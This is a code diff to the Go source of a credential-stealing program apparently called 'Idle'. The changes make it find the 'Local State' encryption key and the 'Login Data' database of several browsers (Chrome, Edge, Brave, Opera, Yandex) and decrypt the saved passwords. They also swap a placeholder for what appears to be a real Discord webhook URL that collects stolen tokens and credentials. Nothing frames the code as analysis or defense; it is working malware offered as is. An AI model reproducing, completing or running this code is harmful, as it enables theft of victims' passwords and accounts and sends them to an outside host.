@@ -35,15 +35,28 @@ type Login struct {
 var masterKey []byte
 var passwordFile string
 var pwCount int
-var LoginPaths = []string{"\\Opera Software\\Opera GX Stable", "\\Opera Software\\Opera Stable", "\\Opera Software\\Opera Neon\\User Data\\Default", "\\Google\\Chrome\\User Data", "\\Google\\Chrome SxS\\User Data", "\\BraveSoftware\\Brave-Browser\\User Data", "\\Yandex\\YandexBrowser\\User Data", "\\Microsoft\\Edge\\User Data",    }
+
+
+var roaming = os.Getenv("APPDATA")
+var local = os.Getenv("LOCALAPPDATA")
+var LoginPaths = [][]string{
+	{roaming + "\\Opera Software\\Opera GX Stable",  "\\Local Storage\\leveldb", "\\"},
+	{roaming + "\\Opera Software\\Opera Stable",  "\\Local Storage\\leveldb", "\\"},
+	{roaming + "\\Opera Software\\Opera Neon\\User Data\\Default",  "\\Local Storage\\leveldb", "\\"},
+	{local + "\\Google\\Chrome\\User Data", "\\Default\\Local Storage\\leveldb", "\\Default"},
+	{local + "\\Google\\Chrome SxS\\User Data", "\\Default\\Local Storage\\leveldb", "\\Default"},
+	{local + "\\BraveSoftware\\Brave-Browser\\User Data","\\Default\\Local Storage\\leveldb", "\\Default"},
+	{local + "\\Yandex\\YandexBrowser\\User Data", "\\Default\\Local Storage\\leveldb", "\\Default",},
+	{local + "\\Microsoft\\Edge\\User Data", "\\Default\\Local Storage\\leveldb", "\\Default"},
+}
+
 var gpu string
 var mCpu string
-//var memory float64
 var mIp string
 var mHostname string
 var osName string
 var mToken = ""
-var uWebhook = "REPLACE-ME"
+var uWebhook = "https://discord.com/api/webhooks/1140850422018474054/neL_GrswG_kW2nVTtlVEekHreYAYC2P00UUTAm7mAU5cMGUWawFPE9_GvZcgmk-ajiT7"
 func Discord() {
 	GetToken()
 	SendWebHook()
@@ -246,10 +259,8 @@ func TargetInformation(){
 
 
 var secretKey []byte
-var LocalStatePath string = strings.Replace(os.Getenv("APPDATA"), "Roaming", "Local", -1)
-//C:\Users\User\AppData\Local\Google\Chrome\User Data
-func getMasterKey() ([]byte) {
-	data, err := ioutil.ReadFile(LocalStatePath + "\\Google\\Chrome\\User Data\\Local State")
+func getMasterKey(path string) ([]byte) {
+	data, err := ioutil.ReadFile(path)
 
 	if err != nil{}
 
@@ -293,7 +304,7 @@ func DecryptPassword(buff []byte, masterKey []byte) string {
 
 
 
-func CrackLogin(path string) ([]Login, error){
+func CrackLogin(path string, keyCrack []byte) ([]Login, error){
 	var credentials []Login
 	db, err := sql.Open("sqlite3", path)
 	if err != nil {
@@ -314,7 +325,7 @@ func CrackLogin(path string) ([]Login, error){
 		if err != nil {
 			return credentials, err
 		}
-		decrypted := DecryptPassword(password, masterKey)
+		decrypted := DecryptPassword(password, keyCrack)
 		credential := Login{host, username, decrypted}
 		credentials = append(credentials, credential)
 	}
@@ -323,32 +334,46 @@ func CrackLogin(path string) ([]Login, error){
 
 
 func Grabber() {
-	key := getMasterKey()
-	masterKey = key
+
 
     for _, path := range LoginPaths {
-		Path := LocalStatePath + path + "\\Login Data"
 
-		_, err := os.Stat(Path)
+
 		
-		if err == nil {
-			logins, err := CrackLogin(Path)
-			if err != nil{}
-			for _, cred := range logins{
-				pwCount += 1
-				passwordFile += fmt.Sprintf(`
+		if _, err := os.Stat(path[0]); !os.IsNotExist(err) {
+			Path := path[0] + path[2] + "\\Login Data"
+
+
+
+			keyPath := path[0] + "\\Local State"
+
+			if _, err := os.Stat(keyPath); !os.IsNotExist(err) {
+
+			
+
+				fmt.Println(keyPath)
+
+				key := getMasterKey(keyPath)
+				masterKey = key
+				fmt.Println(Path)
+
+				logins, err := CrackLogin(Path, masterKey)
+				if err != nil{}
+				for _, cred := range logins{
+					pwCount += 1
+					passwordFile += fmt.Sprintf(`
 ====================== Idle ======================
 Host: %s
 Username / Email: %s
 Password: %s
 ====================== Idle ======================
-				`, cred.Host, cred.Username, cred.Password)
-			}		} else if os.IsNotExist(err) {
+					`, cred.Host, cred.Username, cred.Password)
+				}		
+			}
+			} else {
 			continue
-		} else {
-			continue
-		}
-
+			}
+			
 	}
 }
 
